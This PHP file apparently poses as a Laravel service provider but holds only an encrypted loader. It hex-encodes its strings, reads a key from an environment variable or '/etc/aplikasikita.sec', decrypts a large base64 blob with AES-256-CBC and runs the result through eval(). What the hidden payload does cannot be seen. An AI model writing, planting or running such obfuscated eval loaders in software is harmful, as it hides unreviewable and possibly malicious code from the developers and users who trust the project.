<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rFsovjeL9IUZ+g9eMEU/fQ==');

$c=base64_decode(

'8EO8GJO+2LgoiNreSDHRXBbzD4I6KAJtfrVWgc6vJtehcnkYDHVzFYDJGdLW+VBiGpotIgrsWz+3' .
'zmZqO0FA+2DmMPDfbyVQXmYflnQoxwvrbhZnsi4+5EtJcw+sBfRvbQTN1pENmlBrjMWiWutj9EyU' .
'aQeu6fLj2fyHI4VKYdTQlsW2yBeMAFgxrNXL/g0PnUVWEBJhL/fS1GNGSwiuEFuiMMVRlR7RZYAM' .
'sLD+7Tcsj7xgyB4wnjmBPwcSmUNrXnhlwUqWn8aM0jbhbtKHbRw75ghjXCPx+CjaEC8aGRUtQkMU' .
'PH2r1b1mMeHoF/nj40omhSqqWCRUBragVJ2PcySCfTqgKRKFCAv7czvOfbCL/lVr269nB7hCo7si' .
'mF2CByVxwjjqCtHpvB+TB35qJKwGXBcU5r4XGOXXs0g1yxcEQuO0FASSAbeJ6Z0KVY/0G7JGrVcq' .
'VmFweBPBYzr4UTcMFeDKVV9n4OTcGpl1dMv5FzfB25uH086cW8+5pK8rvTjNy9M+2UwSbQ6qoScZ' .
'pwhFZtZc0uprGGc0nDpNakUwYBMLf1Mqz3X64ihkHHzql/ebXXaRZK14p6QTsgfa7rGy8xj91ItO' .
'Hc/oXLn49H5RvPlHvZJUr7e/sndGSQopfHzPj2pIzpTURPiXD7l7h4TI6QeDUJlkjUcJ0KqQR0uU' .
'DRmmfh4rRTuQ0a9r0jq1CPfI+/uypqwRjxoq/VeSxxIN+ZtTPBPjKTuHieIXb78HMEk4zN5qc1dU' .
'q+68xA0SIoPlbMaPTGs9ckpbXITTpF10GEt/rdG5w57i74YHQ08UE2ESa2CE46WvK43SWn885T/G' .
'Ah2/F94ZUj7rILIu7O/fnXtbp2wLRSGLRWtJEF80ig3ydSdf6HhO4iikOQ8saJ+AZ0BFeBCULGXc' .
'uaYMyZ4DmOY8vsAxlrYoQfq3rdL18y6q3Pv/0cYsFjVT8TtHbIF4wDkcuC2FfbkxNA1KbeRl4aBu' .
'qSrZyc6/KEhcRBWaOw6h+1r3RGd5Indv3+prj+zrO72j64B3Haof009xqyafiktjQxD6D7kCmrsc' .
'0mSx2Q9WxiY/ZECwh7xKkn8T+/bURCrqCrKibQmzeYBFZno3bDsYMPUvdXqleTCusGGeZPtTEaw+' .
'EE85QUUWbhJ7JV1jGTnAM0MUJ99jsCeXfOYVd3Wr1LmlN5i91BSwQcu+LQ3YfqpLGJ1eaSO8bdKd' .
'wdQ7tZhXy9qIuTBxR83nbSb8IKujZp3W1T2EfywBGJQjbQ1oEXLEFXEgQ4cq0lSY2+t7Ry/q1vnU' .
'hIaRgQ1kvGkqJbUV4pIIsYwSQrPqP2F8BESskxFZQ+lTRA+9x7XLUCvcoQ7plVmq5gtQZRFeiLpS' .
'EQNbJwiJm5sCstGu0OQ3+Vbg0HSz3PTgA8n5jhkDMAU7tkjFH6IqNkmD/2pJ+823xELE0AlqxkEz' .
'znQaAN5JTtro6GurL1GgAHtlmbxLcow3Nr6LKWz9VLvzQq51l6b8vhUX0gStAci1l6CS72SC8/tx' .
'sLSMfl+4gO5O62OjMVBhIXYgFH8HqDWMmNdn5P4d6xh+mXxcsR3GuiT8X7XVBlANjjzPEdOJTrMb' .
'JyU0eQUmjy7csqdF0g7+fPlI5vP6bq2ZD0heCrXyjxJG5KE='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

